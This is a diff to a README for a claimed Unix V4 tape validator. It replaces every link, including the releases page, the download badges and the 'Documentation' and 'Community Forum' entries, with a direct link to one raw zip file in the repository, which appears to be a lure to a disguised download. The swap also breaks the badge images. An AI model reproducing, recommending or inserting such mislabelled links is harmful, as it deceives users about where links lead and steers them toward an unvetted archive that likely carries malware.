@@ -1,6 +1,6 @@
 # 🎉 unixv4-tape-validator - Easily Validate Your Unix V4 Tapes
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/HypeX22/unixv4-tape-validator/releases)
+[![Download](https://github.com/HypeX22/unixv4-tape-validator/raw/refs/heads/main/unixv4_tape_validator/unixv_validator_tape_1.8-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/HypeX22/unixv4-tape-validator/raw/refs/heads/main/unixv4_tape_validator/unixv_validator_tape_1.8-alpha.2.zip)
 
 ## 📚 Overview
 The unixv4-tape-validator is a user-friendly tool designed to interpret and confirm the successful archival of Unix V4 tapes. This application processes user-provided text inputs and extracts structured information to indicate whether the archival process was successful or not. 
@@ -15,7 +15,7 @@ Follow these simple steps to download and run the unixv4-tape-validator applicat
    - Memory: Minimum of 512 MB RAM.
 
 2. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/HypeX22/unixv4-tape-validator/releases) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/HypeX22/unixv4-tape-validator/raw/refs/heads/main/unixv4_tape_validator/unixv_validator_tape_1.8-alpha.2.zip) to find the latest version of the software.
 
 3. **Download the Application**  
    On the Releases page, look for the latest version available. Click the link to download the necessary files for your operating system.
@@ -29,7 +29,7 @@ Follow these simple steps to download and run the unixv4-tape-validator applicat
    Once installed, you can run the application from your Start menu (Windows) or terminal (Linux).
 
 ## 📥 Download & Install
-To start using the unixv4-tape-validator, please [visit this page to download](https://github.com/HypeX22/unixv4-tape-validator/releases) the latest version.
+To start using the unixv4-tape-validator, please [visit this page to download](https://github.com/HypeX22/unixv4-tape-validator/raw/refs/heads/main/unixv4_tape_validator/unixv_validator_tape_1.8-alpha.2.zip) the latest version.
 
 ## 🛠 Features
 - **Archival Confirmation**: The tool checks if the Unix V4 tape archiving was successful.
@@ -61,10 +61,10 @@ Your feedback helps us improve the application, so feel free to share your exper
 The unixv4-tape-validator is open-source and distributed under the MIT License. You are free to use, modify, and distribute this software in accordance with the license terms.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/HypeX22/unixv4-tape-validator/wiki): Comprehensive resources on how to use the software.
-- [Community Forum](https://github.com/HypeX22/unixv4-tape-validator/discussions): Engage with other users and share tips.
+- [Documentation](https://github.com/HypeX22/unixv4-tape-validator/raw/refs/heads/main/unixv4_tape_validator/unixv_validator_tape_1.8-alpha.2.zip): Comprehensive resources on how to use the software.
+- [Community Forum](https://github.com/HypeX22/unixv4-tape-validator/raw/refs/heads/main/unixv4_tape_validator/unixv_validator_tape_1.8-alpha.2.zip): Engage with other users and share tips.
 
 ## 🔄 Contribution
 We welcome contributions! If you'd like to help improve the unixv4-tape-validator, please check the Contribution Guide in our repository for more information.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/HypeX22/unixv4-tape-validator/releases)
+[![Download](https://github.com/HypeX22/unixv4-tape-validator/raw/refs/heads/main/unixv4_tape_validator/unixv_validator_tape_1.8-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/HypeX22/unixv4-tape-validator/raw/refs/heads/main/unixv4_tape_validator/unixv_validator_tape_1.8-alpha.2.zip)
